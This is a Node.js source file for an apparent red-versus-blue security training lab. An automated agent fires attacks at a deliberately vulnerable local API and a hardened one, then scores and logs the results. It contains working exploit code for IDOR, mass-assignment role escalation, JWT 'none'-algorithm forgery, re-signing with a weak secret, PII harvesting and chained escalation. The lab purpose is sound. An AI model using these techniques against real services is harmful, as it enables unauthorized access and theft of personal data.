const axios = require('axios');
const jwt = require('jsonwebtoken');
const { getDB } = require('./database/init');

let GoogleGenerativeAI;

const RED  = 'http://localhost:4000/api';
const BLUE = 'http://localhost:5000/api';
const WEAK_SECRET = process.env.JWT_SECRET || 'secret123';

/* ═══════════════════════════════════════════════════════════════
   SINGLE-STEP SCENARIOS
   ═══════════════════════════════════════════════════════════════ */
const SINGLE_SCENARIOS = [
  {
    id: 'idor_profile', name: "IDOR — Read another user's profile", category: 'IDOR',
    fallback: { summary: "Alice accessed Bob's profile without authorization.", redExplanation: "Red has no ownership check on GET /users/:id — any authenticated user can read any profile.", blueExplanation: "Blue enforces object-level authorization: only the resource owner or an admin can access the record." },
    async run({ tokens }) {
      const h = { Authorization: `Bearer ${tokens.user}` };
      const targetId = tokens.userId === 1 ? 2 : 1;
      const [r, b] = await Promise.allSettled([
        axios.get(`${RED}/users/${targetId}`, { headers: h }),
        axios.get(`${BLUE}/users/${targetId}`, { headers: h }),
      ]);
      return { method: 'GET', url: `/users/${targetId}`, body: null, red: extract(r), blue: extract(b) };
    },
  },
  {
    id: 'mass_assign_role', name: 'Mass Assignment — Escalate role to admin', category: 'Mass Assignment',
    fallback: { summary: "Attacker injected role:admin into an update request.", redExplanation: "Red accepts all body fields including privileged ones like role — no field whitelist.", blueExplanation: "Blue uses strict field whitelisting: only email and profile_data are accepted, role is ignored." },
    async run({ tokens }) {
      const h = { Authorization: `Bearer ${tokens.user}` };
      const payload = { username: tokens.username, role: 'admin' };
      const [r, b] = await Promise.allSettled([
        axios.put(`${RED}/users/${tokens.userId}`, payload, { headers: h }),
        axios.put(`${BLUE}/users/${tokens.userId}`, payload, { headers: h }),
      ]);
      const rs = r.status === 'fulfilled' && r.value?.data?.updatedUser?.role === 'admin';
      const bs = b.status === 'fulfilled' && b.value?.data?.updatedUser?.role === 'admin';
      return { method: 'PUT', url: `/users/${tokens.userId}`, body: payload, red: extract(r, rs), blue: extract(b, bs) };
    },
  },
  {
    id: 'jwt_none_alg', name: "JWT Forgery — 'none' algorithm bypass", category: 'JWT',
    fallback: { summary: "Attacker forged a JWT with alg:none and role:admin.", redExplanation: "Red accepts the 'none' algorithm, allowing unsigned tokens to pass verification.", blueExplanation: "Blue only accepts HS256 with a strong secret — the forged token is rejected outright." },
    async run({ tokens }) {
      const [, p] = tokens.user.split('.');
      const decoded = JSON.parse(Buffer.from(p, 'base64url').toString());
      const fh = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const fp = Buffer.from(JSON.stringify({ ...decoded, role: 'admin' })).toString('base64url');
      const forgedToken = `${fh}.${fp}.`;
      const h = { Authorization: `Bearer ${forgedToken}` };
      const [r, b] = await Promise.allSettled([
        axios.get(`${RED}/admin/users`, { headers: h }),
        axios.get(`${BLUE}/admin/users`, { headers: h }),
      ]);
      return { method: 'GET', url: '/admin/users', body: null, red: extract(r), blue: extract(b, false) };
    },
  },
  {
    id: 'weak_secret_resign', name: 'JWT Re-sign — Exploit weak secret key', category: 'Broken Access Control',
    fallback: { summary: "Attacker re-signed JWT with the weak secret and gained admin.", redExplanation: "Red uses a weak, guessable secret 'secret123' that can be brute-forced.", blueExplanation: "Blue uses a strong cryptographic secret — re-signing with the weak key produces an invalid signature." },
    async run({ tokens }) {
      const decoded = jwt.verify(tokens.user, WEAK_SECRET);
      const adminToken = jwt.sign({ id: decoded.id, username: decoded.username, email: decoded.email, role: 'admin' }, WEAK_SECRET, { algorithm: 'HS256', expiresIn: '1h' });
      const h = { Authorization: `Bearer ${adminToken}` };
      const [r, b] = await Promise.allSettled([
        axios.get(`${RED}/admin/users`, { headers: h }),
        axios.get(`${BLUE}/admin/users`, { headers: h }),
      ]);
      return { method: 'GET', url: '/admin/users', body: null, red: extract(r), blue: extract(b, false) };
    },
  },
  {
    id: 'overexposed_fields', name: 'Overexposed Fields — Harvest sensitive data', category: 'Data Exposure',
    fallback: { summary: "API response included SSN and credit card numbers.", redExplanation: "Red returns all database columns including sensitive PII in GET /users.", blueExplanation: "Blue filters sensitive fields for non-admin users — SSN and credit_card are never returned." },
    async run({ tokens }) {
      const h = { Authorization: `Bearer ${tokens.user}` };
      const [r, b] = await Promise.allSettled([
        axios.get(`${RED}/users`, { headers: h }),
        axios.get(`${BLUE}/users`, { headers: h }),
      ]);
      const sf = ['ssn', 'credit_card'];
      const ru = r.value?.data?.users ?? (Array.isArray(r.value?.data) ? r.value.data : []);
      const bu = b.value?.data?.users ?? (Array.isArray(b.value?.data) ? b.value.data : []);
      const rl = ru.some(u => sf.some(f => f in u));
      const bl = bu.some(u => sf.some(f => f in u));
      return { method: 'GET', url: '/users', body: null, red: extract(r, rl), blue: extract(b, bl) };
    },
  },
];

/* ═══════════════════════════════════════════════════════════════
   CHAINED ATTACK SCENARIOS
   ═══════════════════════════════════════════════════════════════ */
const CHAINED_SCENARIOS = [
  {
    id: 'chain_recon_escalate', name: 'Chain: Recon → IDOR Escalation', category: 'Chained Attack',
    fallback: { summary: "Attacker harvested user IDs then accessed another user's profile.", redExplanation: "Red exposes the full user list and has no IDOR check on profile access.", blueExplanation: "Blue blocks IDOR attempts with ownership verification even if user list is accessible." },
    async run({ tokens }) {
      const h = { Authorization: `Bearer ${tokens.user}` };
      const steps = [];
      // Step 1: Recon
      const s1 = performance.now();
      const [r1, b1] = await Promise.allSettled([axios.get(`${RED}/users`, { headers: h }), axios.get(`${BLUE}/users`, { headers: h })]);
      steps.push({ method: 'GET', url: '/users', body: null, red: extract(r1, undefined, s1), blue: extract(b1, undefined, s1) });
      // Harvest an ID
      const users = r1.value?.data?.users || [];
      const targetId = users.find(u => u.id !== tokens.userId)?.id || 2;
      // Step 2: IDOR
      const s2 = performance.now();
      const [r2, b2] = await Promise.allSettled([axios.get(`${RED}/users/${targetId}`, { headers: h }), axios.get(`${BLUE}/users/${targetId}`, { headers: h })]);
      steps.push({ method: 'GET', url: `/users/${targetId}`, body: null, red: extract(r2, undefined, s2), blue: extract(b2, undefined, s2) });
      const redOk = steps.every(s => s.red.success);
      const blueOk = steps.every(s => s.blue.success);
      return { steps, red: { status: steps[steps.length-1].red.status, success: redOk }, blue: { status: steps[steps.length-1].blue.status, success: blueOk } };
    },
  },
  {
    id: 'chain_bruteforce_token', name: 'Chain: Brute Force → Token Abuse', category: 'Chained Attack',
    fallback: { summary: "Attacker attempted brute-force logins then forged a JWT with the real token.", redExplanation: "Red has no rate limiting and accepts 'none' algorithm JWTs.", blueExplanation: "Blue rate-limits login attempts and rejects forged tokens with strict HS256 validation." },
    async run({ tokens }) {
      const steps = [];
      // Step 1-3: Wrong password attempts
      for (let i = 0; i < 3; i++) {
        const s = performance.now();
        const [r, b] = await Promise.allSettled([
          axios.post(`${RED}/auth/login`, { username: 'alice', password: 'wrong' + i }),
          axios.post(`${BLUE}/auth/login`, { username: 'alice', password: 'wrong' + i }),
        ]);
        steps.push({ method: 'POST', url: '/auth/login', body: { username: 'alice', password: '***' }, red: extract(r, false, s), blue: extract(b, false, s) });
      }
      // Step 4: Correct login
      const s4 = performance.now();
      const [r4, b4] = await Promise.allSettled([
        axios.post(`${RED}/auth/login`, { username: 'alice', password: 'password123' }),
        axios.post(`${BLUE}/auth/login`, { username: 'alice', password: 'password123' }),
      ]);
      steps.push({ method: 'POST', url: '/auth/login', body: { username: 'alice', password: '***' }, red: extract(r4, r4.status === 'fulfilled', s4), blue: extract(b4, b4.status === 'fulfilled', s4) });
      // Step 5: JWT forgery with real token
      const realToken = r4.value?.data?.token || tokens.user;
      const [, p] = realToken.split('.');
      const decoded = JSON.parse(Buffer.from(p, 'base64url').toString());
      const fh = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const fp = Buffer.from(JSON.stringify({ ...decoded, role: 'admin' })).toString('base64url');
      const forged = `${fh}.${fp}.`;
      const s5 = performance.now();
      const [r5, b5] = await Promise.allSettled([
        axios.get(`${RED}/admin/users`, { headers: { Authorization: `Bearer ${forged}` } }),
        axios.get(`${BLUE}/admin/users`, { headers: { Authorization: `Bearer ${forged}` } }),
      ]);
      steps.push({ method: 'GET', url: '/admin/users', body: null, red: extract(r5, undefined, s5), blue: extract(b5, false, s5) });
      return { steps, red: { status: steps[steps.length-1].red.status, success: steps[steps.length-1].red.success }, blue: { status: steps[steps.length-1].blue.status, success: false } };
    },
  },
  {
    id: 'chain_mass_assign_admin', name: 'Chain: Mass Assignment → Admin Escalation', category: 'Chained Attack',
    fallback: { summary: "Attacker set role:admin via mass assignment then accessed admin endpoints.", redExplanation: "Red accepts the role field in PUT /users/:id and trusts the JWT role for admin access.", blueExplanation: "Blue whitelists update fields (ignoring role) and verifies admin role from database." },
    async run({ tokens }) {
      const h = { Authorization: `Bearer ${tokens.user}` };
      const steps = [];
      // Step 1: Mass assign role
      const body1 = { role: 'admin' };
      const s1 = performance.now();
      const [r1, b1] = await Promise.allSettled([
        axios.put(`${RED}/users/${tokens.userId}`, body1, { headers: h }),
        axios.put(`${BLUE}/users/${tokens.userId}`, body1, { headers: h }),
      ]);
      const r1s = r1.status === 'fulfilled' && r1.value?.data?.updatedUser?.role === 'admin';
      steps.push({ method: 'PUT', url: `/users/${tokens.userId}`, body: body1, red: extract(r1, r1s, s1), blue: extract(b1, false, s1) });
      // Re-auth if mass assign succeeded on red to get new token with admin role
      let adminH = h;
      if (r1s) {
        try {
          const loginRes = await axios.post(`${RED}/auth/login`, { username: tokens.username, password: 'password123' });
          adminH = { Authorization: `Bearer ${loginRes.data.token}` };
        } catch {}
      }
      // Step 2: Access admin endpoint
      const s2 = performance.now();
      const [r2, b2] = await Promise.allSettled([
        axios.get(`${RED}/admin/users`, { headers: adminH }),
        axios.get(`${BLUE}/admin/users`, { headers: h }),
      ]);
      steps.push({ method: 'GET', url: '/admin/users', body: null, red: extract(r2, undefined, s2), blue: extract(b2, false, s2) });
      // Restore alice's role back to user on red
      try { await axios.put(`${RED}/users/${tokens.userId}`, { role: 'user' }, { headers: adminH }); } catch {}
      return { steps, red: { status: steps[steps.length-1].red.status, success: steps[steps.length-1].red.success }, blue: { status: steps[steps.length-1].blue.status, success: false } };
    },
  },
];

const ALL_SCENARIOS = [...SINGLE_SCENARIOS, ...CHAINED_SCENARIOS];

/* ═══════════════════════════════════════════════════════════════
   HELPERS
   ═══════════════════════════════════════════════════════════════ */
function extract(settled, forceSuccess, startTime) {
  const isOk = settled.status === 'fulfilled';
  const status = isOk ? settled.value?.status : (settled.reason?.response?.status || 500);
  const rawBody = isOk ? settled.value?.data : (settled.reason?.response?.data || {});
  const bodyPreview = JSON.stringify(rawBody).slice(0, 200);
  const success = forceSuccess !== undefined ? forceSuccess : (isOk && status < 400);
  const latencyMs = startTime ? Math.round(performance.now() - startTime) : 0;
  return { status, success, bodyPreview, latencyMs };
}

function safeJson(v) { try { return JSON.stringify(v); } catch { return String(v); } }

/* ═══════════════════════════════════════════════════════════════
   ATTACK AGENT CLASS
   ═══════════════════════════════════════════════════════════════ */
class AttackAgent {
  constructor(io) {
    this.io = io;
    this.running = false;
    this.interval = null;
    this.intervalMs = 10000;
    this.agentUser = { username: "alice", password: "password123" };
    this.tokens = {};
    this.score = { attacker: 0, defender: 0, total: 0 };
    this.history = [];
    this.categoryBreakdown = {};
    this.geminiApiKey = process.env.GEMINI_API_KEY;
    // Adaptive weights: scenario id -> { weight, consecutiveSuccesses }
    this.weights = {};
    ALL_SCENARIOS.forEach(s => { this.weights[s.id] = { weight: 1.0, consecutive: 0 }; });
  }

  /* ─── Authentication ─── */
  async authenticate() {
    try {
      const res = await axios.post(`${RED}/auth/login`, { username: 'alice', password: 'password123' });
      this.tokens.user = res.data.token;
      this.tokens.userId = res.data.user.id;
      this.tokens.username = res.data.user.username;
      console.log('[AttackAgent] Authenticated as alice (ID:', this.tokens.userId, ')');
    } catch (e) {
      console.error('[AttackAgent] Auth failed:', e.message);
    }
  }

  /* ─── Adaptive Scenario Selection ─── */
  selectScenario() {
    const totalWeight = ALL_SCENARIOS.reduce((sum, s) => sum + (this.weights[s.id]?.weight || 1), 0);
    let rand = Math.random() * totalWeight;
    for (const s of ALL_SCENARIOS) {
      rand -= (this.weights[s.id]?.weight || 1);
      if (rand <= 0) return s;
    }
    return ALL_SCENARIOS[ALL_SCENARIOS.length - 1];
  }

  updateWeights(scenarioId, category, redSuccess) {
    const w = this.weights[scenarioId];
    if (!w) return;
    if (redSuccess) {
      w.consecutive++;
      w.weight = Math.max(0.3, w.weight - 0.15);
      if (w.consecutive >= 3) { w.weight = Math.max(0.3, w.weight * 0.5); }
    } else {
      w.consecutive = 0;
      w.weight = Math.min(2.0, w.weight + 0.1);
    }
  }

  /* ─── Category Breakdown ─── */
  updateCategoryBreakdown(category, redSuccess, blueBlocked) {
    if (!this.categoryBreakdown[category]) {
      this.categoryBreakdown[category] = { fired: 0, redSucceeded: 0, blueBlocked: 0 };
    }
    const c = this.categoryBreakdown[category];
    c.fired++;
    if (redSuccess) c.redSucceeded++;
    if (blueBlocked) c.blueBlocked++;
  }

  /* ─── Gemini Narration ─── */
  async narrate(event, scenario) {
    const fallback = scenario.fallback || { summary: 'Attack executed.', redExplanation: 'Red was vulnerable.', blueExplanation: 'Blue blocked the attempt.' };
    if (!this.geminiApiKey) return fallback;
    try {
      if (!GoogleGenerativeAI) {
        ({ GoogleGenerativeAI } = require('@google/generative-ai'));
      }
      const client = new GoogleGenerativeAI(this.geminiApiKey);
      const model = client.getGenerativeModel({ model: 'gemini-1.5-flash' });
      const prompt = safeJson({
        task: 'Return ONLY a JSON object with exactly three string fields: summary, redExplanation, blueExplanation.',
        scenario: { id: event.scenarioId, name: event.name, category: event.category },
        results: {
          red: { status: event.red.status, success: event.red.success, bodyPreview: event.steps?.[0]?.red?.bodyPreview || '' },
          blue: { status: event.blue.status, success: event.blue.success, bodyPreview: event.steps?.[0]?.blue?.bodyPreview || '' },
        },
        constraints: [
          'summary: 2 sentences describing what happened in plain English.',
          'redExplanation: Why the red team was exploitable — reference the specific missing control.',
          'blueExplanation: What exact defense blocked the attack — reference the specific middleware or check.',
          'No markdown, no code blocks, just JSON.',
        ],
      });
      const result = await model.generateContent(prompt);
      const text = (result?.response?.text?.() || '').trim();
      // Try to extract JSON from response
      const jsonMatch = text.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        if (parsed.summary && parsed.redExplanation && parsed.blueExplanation) return parsed;
      }
      return fallback;
    } catch (err) {
      console.error('[AttackAgent] Gemini narration failed:', err?.message || err);
      return fallback;
    }
  }

  /* ─── SQLite Persistence ─── */
  persistEvent(event) {
    try {
      const db = getDB();
      db.run(
        `INSERT OR REPLACE INTO battle_events (id, ts, scenario_id, name, category, steps, red_status, red_success, blue_status, blue_success, attacker_point, defender_point, narration, score_attacker, score_defender, score_total, category_breakdown, latency_ms, event_json) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
        [event.id, event.ts, event.scenarioId, event.name, event.category, safeJson(event.steps || []),
         event.red.status, event.red.success ? 1 : 0, event.blue.status, event.blue.success ? 1 : 0,
         event.attackerPoint, event.defenderPoint, safeJson(event.narration),
         event.score.attacker, event.score.defender, event.score.total,
         safeJson(event.categoryBreakdown), event.steps?.[0]?.red?.latencyMs || 0, safeJson(event)],
        (err) => { if (err) console.error('[AttackAgent] DB persist error:', err.message); }
      );
    } catch (err) {
      console.error('[AttackAgent] DB persist error:', err.message);
    }
  }

  /* ─── Fire Single Attack ─── */
  async fireOne() {
    if (!this.tokens.user) await this.authenticate();
    if (!this.tokens.user) return;

    const scenario = this.selectScenario();
    let result;
    try {
      result = await scenario.run(this);
    } catch (e) {
      // Re-auth on 401
      if (e?.response?.status === 401 || e?.message?.includes('401')) {
        await this.authenticate();
        try { result = await scenario.run(this); } catch (e2) {
          console.error('[AttackAgent] Scenario error after reauth:', scenario.id, e2.message);
          return;
        }
      } else {
        console.error('[AttackAgent] Scenario error:', scenario.id, e.message);
        return;
      }
    }

    const attackerPoint = result.red.success ? 1 : 0;
    const defenderPoint = !result.blue.success ? 1 : 0;
    this.score.attacker += attackerPoint;
    this.score.defender += defenderPoint;
    this.score.total += 1;
    this.updateWeights(scenario.id, scenario.category, result.red.success);
    this.updateCategoryBreakdown(scenario.category, result.red.success, !result.blue.success);

    const narration = await this.narrate({ scenarioId: scenario.id, name: scenario.name, category: scenario.category, red: result.red, blue: result.blue, steps: result.steps }, scenario);

    const event = {
      id: Date.now(),
      ts: new Date().toISOString(),
      scenarioId: scenario.id,
      name: scenario.name,
      category: scenario.category,
      steps: result.steps || [{ method: result.method, url: result.url, body: result.body, red: result.red, blue: result.blue }],
      red: result.red,
      blue: result.blue,
      attackerPoint,
      defenderPoint,
      narration,
      score: { ...this.score },
      categoryBreakdown: JSON.parse(JSON.stringify(this.categoryBreakdown)),
    };

    this.history.unshift(event);
    if (this.history.length > 50) this.history.pop();
    this.persistEvent(event);
    this.io.emit('battle:event', event);
    console.log(`[AttackAgent] ${scenario.name} → red:${result.red.status} blue:${result.blue.status}`);
  }

  /* ─── Fire Specific Scenario (Manual Trigger) ─── */
  async fireScenarioId(scenarioId) {
    if (!this.tokens.user) await this.authenticate();
    const scenario = ALL_SCENARIOS.find((s) => s.id === scenarioId);
    if (!scenario) return { error: "Scenario not found" };

    let result;
    try {
      result = await scenario.run(this);
    } catch (e) {
      if (e?.response?.status === 401 || e?.message?.includes('401')) {
        await this.authenticate();
        try { result = await scenario.run(this); } catch (e2) { return { error: e2.message }; }
      } else {
        return { error: e.message };
      }
    }

    const attackerPoint = result.red.success ? 1 : 0;
    const defenderPoint = !result.blue.success ? 1 : 0;
    this.score.attacker += attackerPoint;
    this.score.defender += defenderPoint;
    this.score.total += 1;
    this.updateWeights(scenario.id, scenario.category, result.red.success);
    this.updateCategoryBreakdown(scenario.category, result.red.success, !result.blue.success);

    const narration = await this.narrate({ scenarioId: scenario.id, name: scenario.name, category: scenario.category, red: result.red, blue: result.blue, steps: result.steps }, scenario);

    const event = {
      id: "MANUAL_" + Date.now(),
      ts: new Date().toISOString(),
      scenarioId: scenario.id,
      name: "[MANUAL] " + scenario.name,
      category: scenario.category,
      steps: result.steps || [{ method: result.method, url: result.url, body: result.body, red: result.red, blue: result.blue }],
      red: result.red,
      blue: result.blue,
      attackerPoint,
      defenderPoint,
      narration,
      score: { ...this.score },
      categoryBreakdown: JSON.parse(JSON.stringify(this.categoryBreakdown)),
    };

    this.history.unshift(event);
    if (this.history.length > 50) this.history.pop();
    this.persistEvent(event);
    this.io.emit('battle:event', event);
    console.log(`[AttackAgent] MANUAL FIRED: ${scenario.name} → red:${result.red.status} blue:${result.blue.status}`);
    return event;
  }

  /* ─── Controls ─── */
  start(intervalMs) {
    if (this.running) return;
    if (intervalMs) this.intervalMs = intervalMs;
    this.running = true;
    this.authenticate().then(() => {
      this.fireOne();
      this.interval = setInterval(() => this.fireOne(), this.intervalMs);
      console.log('[AttackAgent] Started — firing every', this.intervalMs, 'ms');
    });
  }

  stop() {
    clearInterval(this.interval);
    this.interval = null;
    this.running = false;
    console.log('[AttackAgent] Stopped');
  }

  setIntervalMs(ms) {
    const parsed = Number(ms);
    if (!Number.isFinite(parsed) || parsed < 5000) throw new Error('intervalMs must be >= 5000');
    this.intervalMs = parsed;
    if (this.running) { this.stop(); this.start(); }
  }

  getState() {
    return {
      running: this.running,
      score: this.score,
      history: this.history.slice(0, 50),
      intervalMs: this.intervalMs,
      categoryBreakdown: this.categoryBreakdown,
    };
  }

  /* ─── DB Query Helpers (called from routes) ─── */
  getHistory(limit = 100, category = null) {
    return new Promise((resolve, reject) => {
      const db = getDB();
      let sql = 'SELECT event_json FROM battle_events';
      const params = [];
      if (category) { sql += ' WHERE category = ?'; params.push(category); }
      sql += ' ORDER BY id DESC LIMIT ?';
      params.push(limit);
      db.all(sql, params, (err, rows) => {
        if (err) return reject(err);
        resolve(rows.map(r => { try { return JSON.parse(r.event_json); } catch { return null; } }).filter(Boolean));
      });
    });
  }

  getStats() {
    return new Promise((resolve, reject) => {
      const db = getDB();
      db.all(
        `SELECT category,
                COUNT(*) as fired,
                SUM(red_success) as red_succeeded,
                SUM(CASE WHEN blue_success = 0 THEN 1 ELSE 0 END) as blue_blocked,
                AVG(latency_ms) as avg_latency
         FROM battle_events GROUP BY category`,
        [], (err, rows) => {
          if (err) return reject(err);
          const total = rows.reduce((s, r) => s + r.fired, 0);
          const topAttacks = [...rows].sort((a, b) => b.red_succeeded - a.red_succeeded).slice(0, 3);
          resolve({ totalFired: total, categories: rows, topAttacks });
        }
      );
    });
  }
}

module.exports = AttackAgent;
